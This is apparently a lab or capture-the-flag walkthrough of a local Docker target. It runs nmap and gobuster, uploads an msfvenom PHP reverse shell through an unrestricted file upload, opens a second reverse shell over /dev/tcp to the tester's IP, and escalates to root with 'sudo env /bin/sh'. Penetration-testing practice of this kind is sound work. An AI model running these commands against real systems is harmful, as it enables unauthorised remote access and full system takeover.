
![Pasted image 20250205134718](https://github.com/user-attachments/assets/c559485b-954b-4aaa-b2c9-78db12544ae2)

We test the connection with the victim machine

```bash
ping -c 1 172.17.0.2
```
![image](https://github.com/user-attachments/assets/ca42314b-8c8c-4636-8527-5ec06a9783e6)

    ttl =64 ==> linux OS

As the victim machine is within reach, we will send a request for a response with the ports that are open.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
![image](https://github.com/user-attachments/assets/cb381a7f-8e0f-4e96-83b5-09b4d86167f5)

    -oG AllPorts = save the output in the AllPorts file.

Now we launch a port scan

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/be9abb3a-7a49-42e6-94d0-7993b2212504)

With this we only conclude that our attack will focus only on port 80 which is the web page, so we will analyze it.

![image](https://github.com/user-attachments/assets/d60cf894-e4d3-41c4-be9a-1bb7dac9ae1c)

It is a simple website to upload files and store them so we will upload test files to see what formats it accepts.

![image](https://github.com/user-attachments/assets/11ec69e4-ae17-42ea-992f-578f6ac82d21)
![image](https://github.com/user-attachments/assets/6fc481b1-b4d8-40fe-a6c6-b72f6366251f)
![image](https://github.com/user-attachments/assets/bb387ee1-c8a5-4c22-9d4d-53a600cb5005)
![image](https://github.com/user-attachments/assets/fdcaa1af-ce50-4426-82a0-024d6d5ffbdd)

We have managed to upload the files but we do not know where they are so we will apply fuzzing to discover new directories.
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/4cb06ba9-d0a3-44d3-8c88-542e7cafb43e)
![image](https://github.com/user-attachments/assets/b99a440d-9023-4202-9584-f063d335b13a)

As we can see we find the destination where our files are stored, so if we can upload a malicious file to get a revershell we could have access to the machine.
```bash
msfvenom -p php/reverse_php LHOST=192.168.1.228=443 -f raw >ARCHIVO_NEW.php
```
![image](https://github.com/user-attachments/assets/7492d350-4877-40bd-a8f8-109315f00545)
![image](https://github.com/user-attachments/assets/c313d3ae-14aa-4676-8aca-9f3daedcb7fd)

We will upload our malicious file

![image](https://github.com/user-attachments/assets/76debd5b-3d09-4248-b8be-841cb1454b39)
![image](https://github.com/user-attachments/assets/608e6707-f2fd-49b9-a47e-3f74d27c12b6)

we go into listening mode
```bash
nc -nlvp 443
```

![image](https://github.com/user-attachments/assets/8a99c7f9-9376-45f2-9c6a-dba95150719b)

we open our malicious file

![image](https://github.com/user-attachments/assets/1b72181e-44c5-4d1a-bf28-54c93568d82c)

we have conexion!!!

![image](https://github.com/user-attachments/assets/03b641b6-97cd-4fc6-96db-941fd855c6ec)

To stabilize the connection we will send the traffic to another of our ports.
```bash
nc nlvp 444
```
![image](https://github.com/user-attachments/assets/8ef08de8-fa7f-4353-b569-5468cebabdaf)


```bash
bash -c "sh -i >& /dev/tcp/192.168.1.228/444 0>&1"
```
![image](https://github.com/user-attachments/assets/d671a70c-f134-40f5-b447-2fe1407e95d4)

We already have a new connection

![image](https://github.com/user-attachments/assets/ccc3cd25-5388-4e40-b689-58111ec9aa1c)

now we will make a treatment of the tty

```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
Finally we have a treated and stabilized tty

![image](https://github.com/user-attachments/assets/7618d11b-74e2-4a92-b1b8-c845616ac316)

Now we will escalate privileges

```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/89003549-6cc4-405f-9eb1-0aec574ae83c)
![image](https://github.com/user-attachments/assets/f8135744-7786-4d69-876f-bcc989e65687)

```bash
sudo env /bin/sh
```
![image](https://github.com/user-attachments/assets/6d04adb6-8c59-495c-a212-fcac90a68b28)





